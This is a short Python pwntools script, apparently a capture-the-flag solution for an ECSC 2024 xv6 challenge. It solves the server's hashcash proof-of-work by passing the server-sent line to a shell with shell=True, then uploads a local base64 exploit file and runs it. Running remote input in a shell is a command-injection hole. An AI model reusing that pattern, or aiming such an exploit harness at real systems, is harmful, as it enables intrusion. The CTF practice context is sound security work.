from pwn import *
import subprocess
import time

conn = remote("xv6homework.challs.open.ecsc2024.it", 38016)

while True:
    data = conn.recvline().decode().strip()
    if data.startswith('hashcash'):
        print(data)
        result = subprocess.run(data, shell=True, stdout=subprocess.PIPE)
        hashcash_result = result.stdout.decode().strip()
        hashcash_result = hashcash_result.replace("hashcash stamp: ", "")
        print(hashcash_result)
        time.sleep(1)
        conn.sendline(bytes(hashcash_result,"ascii"))
        time.sleep(1)
        with open('exploit.base64', 'rb') as f:
                conn.send(f.read())
        conn.sendline(b'EOF')
        time.sleep(1)
        conn.sendline(b'exe')
        while True:
            data = conn.recvline().decode().strip()
            print(data)
        break

conn.close()

